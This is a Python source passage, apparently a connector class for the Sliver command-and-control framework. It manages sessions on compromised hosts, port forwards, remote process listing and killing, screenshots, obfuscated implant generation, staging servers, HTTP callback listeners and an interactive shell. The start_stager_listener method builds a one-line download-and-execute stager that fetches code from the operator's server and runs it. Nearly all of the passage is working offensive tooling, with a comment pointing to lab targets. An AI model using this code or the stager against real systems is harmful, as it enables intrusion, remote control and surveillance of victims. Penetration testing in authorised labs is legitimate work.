            logger.debug(f"Failed to parse ls date '{month} {day} {time_or_year}': {e}")
            # Return current time as fallback
            return datetime.now()

    async def create_port_forward(
        self,
        session_id: str,
        local_port: int,
        remote_host: str,
        remote_port: int,
        local_host: str = "127.0.0.1",
    ) -> PortForward:
        """Create port forward via Sliver.

        Args:
            session_id: Session ID or name
            local_port: Local port to bind
            remote_host: Remote host to forward to
            remote_port: Remote port to forward to
            local_host: Local host to bind (default: 127.0.0.1)

        Returns:
            Port forward information

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            CommandExecutionError: If port forward fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            # Create port forward via Sliver
            # Note: Actual sliver-py API may differ
            await self.client.create_port_forward(session.ID, local_host, local_port, f"{remote_host}:{remote_port}")

            # Create port forward object
            pf_id = str(uuid.uuid4())
            port_forward = PortForward(
                id=pf_id,
                session_id=session.ID,
                local_host=local_host,
                local_port=local_port,
                remote_host=remote_host,
                remote_port=remote_port,
                status=PortForwardStatus.ACTIVE,
                created_at=datetime.now(),
            )

            # Track port forward
            self._port_forwards[pf_id] = port_forward

            logger.info(
                f"Created port forward: {local_host}:{local_port} -> "
                f"{remote_host}:{remote_port} (session: {session.Name})"
            )

            return port_forward

        except Exception as e:
            logger.error(f"Port forward creation failed: {e}")
            raise CommandExecutionError(f"Failed to create port forward: {e}") from e

    async def list_port_forwards(self, session_id: str | None = None) -> list[PortForward]:
        """List active port forwards.

        Args:
            session_id: Optional session ID to filter by

        Returns:
            List of active port forwards
        """
        if session_id:
            # Filter by session
            return [pf for pf in self._port_forwards.values() if pf.session_id == session_id]
        else:
            # Return all
            return list(self._port_forwards.values())

    async def remove_port_forward(self, port_forward_id: str) -> bool:
        """Remove port forward.

        Args:
            port_forward_id: Port forward identifier

        Returns:
            True if successful

        Raises:
            ConnectionError: If not connected
            CommandExecutionError: If removal fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        if port_forward_id not in self._port_forwards:
            logger.warning(f"Port forward {port_forward_id} not found")
            return False

        try:
            pf = self._port_forwards[port_forward_id]

            # Remove from Sliver
            # Note: Actual sliver-py API may differ
            await self.client.remove_port_forward(pf.session_id, pf.local_port)

            # Remove from tracking
            del self._port_forwards[port_forward_id]

            logger.info(f"Removed port forward: {pf.local_host}:{pf.local_port}")
            return True

        except Exception as e:
            logger.error(f"Port forward removal failed: {e}")
            raise CommandExecutionError(f"Failed to remove port forward: {e}") from e

    async def get_processes(self, session_id: str) -> list[ProcessInfo]:
        """Get process list from remote system.

        Args:
            session_id: Session ID or name

        Returns:
            List of processes

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            CommandExecutionError: If process listing fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            # Get process list via Sliver
            # Note: Actual sliver-py API may provide direct process listing
            # For now, we'll use ps command
            os_type = session.OS.lower()

            # Get session interaction
            interaction = await self.client.interact_session(session.ID)

            if "windows" in os_type:
                # Windows: use tasklist
                result = await interaction.execute("tasklist", ["/V", "/FO", "CSV"])
            else:
                # Linux/Unix: use ps
                result = await interaction.execute("ps", ["aux"])

            if result.Status != 0:
                raise CommandExecutionError(f"Failed to get processes: {result.Stderr.decode('utf-8')}")

            # Parse process output
            processes = []

            if "windows" in os_type:
                # Parse Windows tasklist CSV output
                lines = result.Stdout.decode("utf-8").strip().split("\n")
                if len(lines) > 1:
                    # Skip header
                    for line in lines[1:]:
                        # CSV parsing would be more robust here
                        parts = line.split('","')
                        if len(parts) >= 9:
                            name = parts[0].strip('"')
                            pid_str = parts[1].strip('"')
                            if pid_str.isdigit():
                                process = ProcessInfo(
                                    pid=int(pid_str),
                                    ppid=0,  # Not available in tasklist
                                    name=name,
                                    executable=name,
                                    owner=parts[6].strip('"') if len(parts) > 6 else "",
                                    cpu_percent=0.0,
                                    memory_percent=0.0,
                                    memory_vms=0,
                                    memory_rss=0,
                                    status=parts[5].strip('"') if len(parts) > 5 else "running",
                                )
                                processes.append(process)
            else:
                # Parse Unix ps output
                lines = result.Stdout.decode("utf-8").strip().split("\n")
                if len(lines) > 1:
                    # Skip header
                    for line in lines[1:]:
                        parts = line.split(None, 10)
                        if len(parts) >= 11:
                            try:
                                process = ProcessInfo(
                                    pid=int(parts[1]),
                                    ppid=0,  # Would need different ps options
                                    name=parts[10].split()[0] if parts[10] else "unknown",
                                    executable=parts[10] if len(parts) > 10 else "",
                                    owner=parts[0],
                                    cpu_percent=float(parts[2]),
                                    memory_percent=float(parts[3]),
                                    memory_vms=int(parts[4]) * 1024 if parts[4].isdigit() else 0,  # VSZ in KB
                                    memory_rss=int(parts[5]) * 1024 if parts[5].isdigit() else 0,  # RSS in KB
                                    status="running",
                                    cmdline=parts[10].split() if len(parts) > 10 else [],
                                )
                                processes.append(process)
                            except (ValueError, IndexError):
                                continue

            return processes

        except Exception as e:
            logger.error(f"Process listing failed: {e}")
            raise CommandExecutionError(f"Failed to list processes: {e}") from e

    async def kill_process(self, session_id: str, pid: int, force: bool = False) -> bool:
        """Kill a process on remote system.

        Args:
            session_id: Session ID or name
            pid: Process ID to kill
            force: Force kill (SIGKILL vs SIGTERM)

        Returns:
            True if successful

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            CommandExecutionError: If kill fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            os_type = session.OS.lower()

            # Get session interaction
            interaction = await self.client.interact_session(session.ID)

            if "windows" in os_type:
                # Windows: use taskkill
                args = ["/PID", str(pid)]
                if force:
                    args.append("/F")
                result = await interaction.execute("taskkill", args)
            else:
                # Linux/Unix: use kill
                signal = "-9" if force else "-15"
                result = await interaction.execute("kill", [signal, str(pid)])

            # Check if successful
            if result.Status == 0:
                logger.info(f"Killed process {pid} on {session.Name}")
                return True
            else:
                # Some errors are expected (e.g., process not found)
                stderr = result.Stderr.decode("utf-8")
                if "no such process" in stderr.lower() or "not found" in stderr.lower():
                    logger.warning(f"Process {pid} not found on {session.Name}")
                    return False
                else:
                    raise CommandExecutionError(f"Failed to kill process: {stderr}")

        except Exception as e:
            logger.error(f"Process kill failed: {e}")
            raise CommandExecutionError(f"Failed to kill process {pid}: {e}") from e

    async def take_screenshot(self, session_id: str, display: str = "") -> Screenshot:
        """Take screenshot of remote system.

        Args:
            session_id: Session ID or name
            display: Display identifier (optional, for Linux)

        Returns:
            Screenshot capture result

        Raises:
            ConnectionError: If not connected
            SessionNotFoundError: If session not found
            CommandExecutionError: If screenshot fails
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        # Get session
        session = await self._get_session_by_id_or_name(session_id)
        if not session:
            raise SessionNotFoundError(f"Session '{session_id}' not found")

        try:
            # Use Sliver's screenshot capability
            # Note: Actual sliver-py API may differ
            screenshot_data = await self.client.screenshot(session.ID, display=display)

            # Get actual resolution from image data
            resolution = self._get_image_resolution(screenshot_data)

            # Create screenshot object
            screenshot = Screenshot(
                session_id=session.ID,
                timestamp=datetime.now(),
                display=display,
                resolution=resolution,
                format="png",
                size_bytes=len(screenshot_data),
                data=screenshot_data,
            )

            logger.info(f"Captured screenshot from {session.Name} ({len(screenshot_data)} bytes)")
            return screenshot

        except Exception as e:
            logger.error(f"Screenshot capture failed: {e}")
            raise CommandExecutionError(f"Failed to capture screenshot: {e}") from e

    def _get_image_resolution(self, image_data: bytes) -> tuple[int, int]:
        """Extract resolution from PNG image data.

        Args:
            image_data: Raw image data

        Returns:
            Tuple of (width, height)
        """
        try:
            # PNG header check
            if image_data[:8] == b"\x89PNG\r\n\x1a\n":
                # PNG IHDR chunk contains dimensions
                # IHDR is always first chunk after signature
                # Width is at bytes 16-19, height at 20-23 (big-endian)
                width = int.from_bytes(image_data[16:20], "big")
                height = int.from_bytes(image_data[20:24], "big")
                return (width, height)
            else:
                # Try other formats or use default
                logger.debug("Unknown image format, using default resolution")
                return (1920, 1080)
        except Exception as e:
            logger.debug(f"Failed to extract image resolution: {e}")
            return (1920, 1080)

    # Implant management methods
    async def generate_implant(self, config: ImplantConfig) -> ImplantInfo:
        """Generate a new Sliver implant.

        Args:
            config: Implant configuration

        Returns:
            Generated implant information

        Raises:
            ConnectionError: If not connected
            CommandExecutionError: If generation fails
        """
        if not self.connected or not self.client or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        try:
            return await self._implant_generator.generate_implant(config)
        except Exception as e:
            logger.error(f"Implant generation failed: {e}")
            raise

    async def list_implants(self) -> list[ImplantInfo]:
        """List all generated implants.

        Returns:
            List of implant information

        Raises:
            ConnectionError: If not connected
        """
        if not self.connected or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        return await self._implant_generator.list_implants()

    async def delete_implant(self, implant_id: str) -> bool:
        """Delete a generated implant.

        Args:
            implant_id: Implant identifier

        Returns:
            True if successful

        Raises:
            ConnectionError: If not connected
        """
        if not self.connected or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        return await self._implant_generator.delete_implant(implant_id)

    async def start_staging_server(
        self,
        host: str = "0.0.0.0",  # noqa: S104
        port: int | None = None,
        serve_path: str = ".",
    ) -> StagingServer:
        """Start implant staging server.

        Args:
            host: Bind address
            port: Bind port (if None, random port will be used)
            serve_path: Directory to serve (ignored, uses implant directory)

        Returns:
            Staging server information

        Raises:
            ConnectionError: If not connected
            CommandExecutionError: If server fails to start
        """
        if not self.connected or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        return await self._implant_generator.start_staging_server(host, port)

    async def stop_staging_server(self, server_id: str) -> bool:
        """Stop staging server.

        Args:
            server_id: Server identifier

        Returns:
            True if successful

        Raises:
            ConnectionError: If not connected
        """
        if not self.connected or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        return await self._implant_generator.stop_staging_server(server_id)

    async def list_staging_servers(self) -> list[StagingServer]:
        """List active staging servers.

        Returns:
            List of staging servers

        Raises:
            ConnectionError: If not connected
        """
        if not self.connected or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        return await self._implant_generator.list_staging_servers()

    async def start_stager_listener(
        self,
        name: str,
        host: str,
        port: int | None = None,
        protocol: str = "http",
        progress_callback: Callable[[str], None] | None = None,
    ) -> tuple[StagerListener, str]:
        """Start stager listener and return stager code.

        This starts an actual HTTP server to handle stager requests.

        Args:
            name: Stager name
            host: Host address
            port: Port number (if None, random port will be used)
            protocol: Protocol (http/https)

        Returns:
            Tuple of (StagerListener info, stager code)

        Raises:
            ConnectionError: If not connected
        """
        if not self.connected or not self._implant_generator:
            raise ConnectionError("Not connected to Sliver C2")

        # Use random port if not specified
        if port is None:
            port = self._implant_generator._find_available_port()

        # Create listener ID first
        listener_id = str(uuid.uuid4())[:8]

        # Register connector in global registry
        global _stager_handler_registry
        _stager_handler_registry[listener_id] = {"connector": self, "server_info": f"{host}:{port}"}

        # Pre-generate common implants to avoid asyncio loop issues
        logger.info("Pre-generating common implants...")
        if progress_callback:
            progress_callback("[*] Pre-generating implants (this may take ~30 seconds)...")
        else:
            print("[*] Pre-generating implants (this may take ~30 seconds)...")

        await self._pre_generate_implants(listener_id, host, port, progress_callback)

        if progress_callback:
            progress_callback("[+] Pre-generation complete!")
        else:
            print("[+] Pre-generation complete!")

        # Create custom handler with listener ID reference
        class CustomStagerHandler(StagerHTTPHandler):
            pass

        # Set listener_id as class attribute after class definition
        CustomStagerHandler.listener_id = listener_id

        logger.info(f"Creating HTTP server with listener ID: {listener_id}")
        logger.info("Registered connector in global registry")

        # Start HTTP server in a separate thread
        server = HTTPServer(("0.0.0.0", port), CustomStagerHandler)  # noqa: S104
        server_thread = threading.Thread(target=server.serve_forever, daemon=True)
        server_thread.start()

        # Create listener info
        url = f"{protocol}://{host}:{port}"

        listener = StagerListener(
            id=listener_id,
            name=name,
            url=url,
            host=host,
            port=port,
            protocol=protocol,
            status="running",
            started_at=datetime.now(),
        )

        # Store server reference for later management
        self._active_servers[listener_id] = (server, server_thread)

        # Generate Python stager code with environment detection
        stager_code = (
            f'python -c "import urllib2,platform;'
            f"o=platform.system().lower();"
            f"a='64' if '64' in platform.machine() else '32';"
            f"exec(urllib2.urlopen('{url}/s?o='+o+'&a='+a).read())\""
        )

        logger.info(f"Stager listener started: {name} on {url} (actual HTTP server running)")
        return listener, stager_code

    async def stop_stager_listener(self, listener_id: str) -> bool:
        """Stop stager listener.

        Args:
            listener_id: Listener ID

        Returns:
            True if successful
        """
        if listener_id in self._active_servers:
            server, thread = self._active_servers[listener_id]

            # Shutdown the HTTP server
            server.shutdown()
            server.server_close()

            # Remove from active servers
            del self._active_servers[listener_id]

            # Remove from global registry
            global _stager_handler_registry
            if listener_id in _stager_handler_registry:
                del _stager_handler_registry[listener_id]

            logger.info(f"Stopped stager listener: {listener_id}")
            return True

        logger.warning(f"Stager listener not found: {listener_id}")
        return False

    async def _pre_generate_implants(
        self, listener_id: str, host: str, port: int, progress_callback: Callable[[str], None] | None = None
    ) -> None:
        """Pre-generate common implants to avoid asyncio issues in HTTP handler.

        Args:
            listener_id: Listener identifier
            host: Callback host
            port: Callback port
        """
        # Common OS/arch combinations to pre-generate
        common_targets = [
            ("linux", "386"),  # HTB Lame
            ("linux", "amd64"),  # Modern Linux
            ("windows", "386"),  # 32-bit Windows
            ("windows", "amd64"),  # 64-bit Windows
        ]

        global _implant_cache, _implant_cache_lock

        total_targets = len(common_targets)
        for idx, (os_type, arch) in enumerate(common_targets, 1):
            try:
                # Create cache key matching the format used in HTTP handler
                cache_key = f"{listener_id}:{os_type}:{arch}"

                # Skip if already cached
                with _implant_cache_lock:
                    if cache_key in _implant_cache:
                        logger.info(f"Skipping already cached implant: {cache_key}")
                        continue

                # Generate unique name for Sliver
                implant_name = f"stager_{os_type}_{arch}"
                timestamp = int(time.time())
                unique_name = f"{implant_name}_{listener_id}_{timestamp}"

                # Determine format - use exe for Linux as it's slightly smaller
                if os_type == "windows":
                    implant_format = "shellcode"  # Shellcode works on Windows
                elif os_type == "linux":
                    implant_format = "exe"  # exe is ~14MB vs shared ~16MB
                else:
                    implant_format = "exe"

                # Create implant config
                # IMPORTANT: Use the stager host for callbacks, not the gRPC server address
                config = ImplantConfig(
                    name=unique_name,
                    os=os_type,
                    arch=arch,
                    format=implant_format,
                    protocol="http",
                    callback_host=host,  # Use the stager host provided by the user
                    callback_port=80,  # Default HTTP port for callbacks
                    skip_symbols=True,
                    obfuscate=True,
                    debug=False,
                )

                if progress_callback:
                    progress_callback(f"[{idx}/{total_targets}] Generating {os_type}/{arch} implant...")
                else:
                    print(f"[{idx}/{total_targets}] Generating {os_type}/{arch} implant...")
                logger.info(f"Pre-generating implant: {implant_name} ({os_type}/{arch})")

                # Generate implant
                implant_info = await self._implant_generator.generate_implant(config)

                # Read generated file
                implant_path = Path(implant_info.file_path)
                if implant_path.exists():
                    with open(implant_path, "rb") as f:
                        implant_data = f.read()

                    # Cache the implant data
                    with _implant_cache_lock:
                        _implant_cache[cache_key] = {
                            "data": implant_data,
                            "info": implant_info,
                            "generated_at": datetime.now(),
                        }

                    logger.info(f"Cached implant {implant_name}: {len(implant_data)} bytes")
                else:
                    logger.error(f"Generated implant file not found: {implant_path}")

            except Exception as e:
                logger.error(f"Failed to pre-generate {implant_name}: {e}")
                # Continue with other implants

    async def list_stager_listeners(self) -> list[StagerListener]:
        """List active stager listeners.

        Returns:
            List of stager listeners
        """
        listeners = []

        for listener_id, (server, thread) in self._active_servers.items():
            if thread.is_alive():
                # Reconstruct listener info from server
                host, port = server.server_address
                listener = StagerListener(
                    id=listener_id,
                    name="stager",
                    url=f"http://{host}:{port}",
                    host=host,
                    port=port,
                    protocol="http",
                    status="running",
                    started_at=datetime.now(),  # We don't store the actual start time
                )
                listeners.append(listener)

        return listeners

    async def get_stager_downloads(self) -> list[StagerDownload]:
        """Get active stager downloads.

        Returns:
            List of active downloads
        """
        downloads = []
        global _active_downloads, _downloads_lock

        with _downloads_lock:
            # Clean up old completed/failed downloads (older than 5 minutes)
            cutoff_time = datetime.now() - timedelta(minutes=5)
            to_remove = []

            for download_id, download_info in _active_downloads.items():
                if download_info["status"] in ["completed", "failed"]:
                    if download_info["started"] < cutoff_time:
                        to_remove.append(download_id)
                        continue

                # Create StagerDownload object
                download = StagerDownload(
                    id=download_id,
                    client=download_info["client"],
                    implant=download_info["implant"],
                    size=download_info["size"],
                    transferred=download_info["transferred"],
                    started=download_info["started"],
                    status=download_info["status"],
                    listener_id=download_info["listener_id"],
                )
                downloads.append(download)

            # Remove old entries
            for download_id in to_remove:
                del _active_downloads[download_id]

        return downloads

    # HTTP Listener Management (for implant callbacks)
    async def start_http_listener(self, host: str, port: int = 80) -> dict:
        """Start HTTP listener for implant callbacks.

        Args:
            host: Host address to bind
            port: Port to bind (default: 80)

        Returns:
            HTTP listener information
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        try:
            logger.info(f"Starting HTTP listener on {host}:{port}")

            # Start HTTP listener using Sliver client
            result = await self.client.start_http_listener(host=host, port=port)

            # Extract JobID from HTTPListener result
            job_id = result.JobID if hasattr(result, "JobID") else None

            logger.info(f"HTTP listener started with job ID: {job_id}")

            return {
                "id": str(job_id) if job_id else "unknown",
                "host": host,
                "port": port,
                "protocol": "http",
                "status": "active",
            }

        except Exception as e:
            logger.error(f"Failed to start HTTP listener: {e}")
            # Provide more specific error messages
            if "bind" in str(e).lower():
                raise CommandExecutionError(f"Port {port} already in use") from e
            elif "permission" in str(e).lower():
                raise CommandExecutionError(
                    f"Permission denied for port {port}. Try a port > 1024 or run with sudo"
                ) from e
            else:
                raise CommandExecutionError(f"Failed to start HTTP listener: {e}") from e

    async def list_http_listeners(self) -> list[dict]:
        """List active HTTP listeners.

        Returns:
            List of HTTP listener information
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        try:
            logger.info("Listing HTTP listeners")

            # Get all jobs from Sliver
            jobs = await self.client.jobs()

            # Filter for HTTP/HTTPS listeners
            http_listeners = []
            for job in jobs:
                # Check if this is an HTTP listener
                # Based on debug output, jobs have Protocol="tcp" and Name="http" for HTTP listeners
                is_http = False

                # Check Name field
                if hasattr(job, "Name") and job.Name in ["http", "https"]:
                    is_http = True
                    protocol = job.Name
                # Check Protocol and Port combination
                elif hasattr(job, "Protocol") and hasattr(job, "Port"):
                    if job.Protocol == "tcp" and job.Port in [80, 443, 8080, 8443]:
                        is_http = True
                        protocol = "https" if job.Port in [443, 8443] else "http"

                if is_http:
                    # Extract job details
                    job_id = job.ID if hasattr(job, "ID") else str(job)
                    port = job.Port if hasattr(job, "Port") else 0

                    # Try to get host from Domains field
                    host = "0.0.0.0"  # noqa: S104
                    if hasattr(job, "Domains") and job.Domains:
                        # Domains might be a string or list
                        if isinstance(job.Domains, str):
                            host = job.Domains.split(",")[0] if job.Domains else "0.0.0.0"  # noqa: S104
                        elif isinstance(job.Domains, list) and job.Domains:
                            host = job.Domains[0]

                    http_listeners.append(
                        {"id": str(job_id), "host": host, "port": port, "protocol": protocol, "status": "active"}
                    )

            logger.info(f"Found {len(http_listeners)} HTTP listeners")
            return http_listeners

        except Exception as e:
            logger.error(f"Failed to list HTTP listeners: {e}")
            raise

    async def stop_http_listener(self, job_id: str) -> bool:
        """Stop HTTP listener.

        Args:
            job_id: Job ID of the HTTP listener

        Returns:
            True if successful
        """
        if not self.connected or not self.client:
            raise ConnectionError("Not connected to Sliver C2")

        try:
            logger.info(f"Stopping HTTP listener: {job_id}")

            # Kill the job - Sliver uses numeric job IDs
            try:
                numeric_job_id = int(job_id)
            except ValueError as e:
                raise CommandExecutionError(f"Invalid job ID: {job_id}") from e

            # Use kill_job method (confirmed from debug output)
            await self.client.kill_job(job_id=numeric_job_id)

            logger.info(f"Successfully stopped HTTP listener: {job_id}")
            return True

        except Exception as e:
            logger.error(f"Failed to stop HTTP listener: {e}")
            if "not found" in str(e).lower():
                raise CommandExecutionError(f"Job {job_id} not found") from e
            else:
                raise CommandExecutionError(f"Failed to stop HTTP listener: {e}") from e

    async def ensure_http_listener(self, host: str, port: int = 80) -> dict:
        """Ensure HTTP listener is running, start if not.

        Args:
            host: Host address
            port: Port number

        Returns:
            HTTP listener information
        """
        # Check if already running
        listeners = await self.list_http_listeners()
        for listener in listeners:
            if listener.get("host") == host and listener.get("port") == port:
                logger.info(f"HTTP listener already running on {host}:{port}")
                return listener

        # Start new listener
        logger.info(f"Starting new HTTP listener on {host}:{port}")
        return await self.start_http_listener(host, port)


class RealInteractiveShell(InteractiveShell):
    """Real interactive shell using Sliver."""

    def __init__(self, connector: RealSliverConnector, session: Session):
        """Initialize real interactive shell.

        Args:
            connector: Real Sliver connector instance
            session: Session information
        """
        super().__init__(connector, session)
        self.real_connector = connector

    async def execute(self, command: str) -> str:
        """Execute command in shell.

        Args:
            command: Command to execute

        Returns:
            Command output

        Raises:
            RuntimeError: If shell is not active
            CommandExecutionError: If command fails
        """
        if not self.active:
            raise RuntimeError("Shell session is not active")

        try:
            result = await self.real_connector.execute_command(self.session.id, command)
            # Combine stdout and stderr for shell output
            output = result.stdout
            if result.stderr:
                output += f"\n{result.stderr}"
            return output
        except Exception as e:
            raise CommandExecutionError(f"Shell command failed: {e}") from e
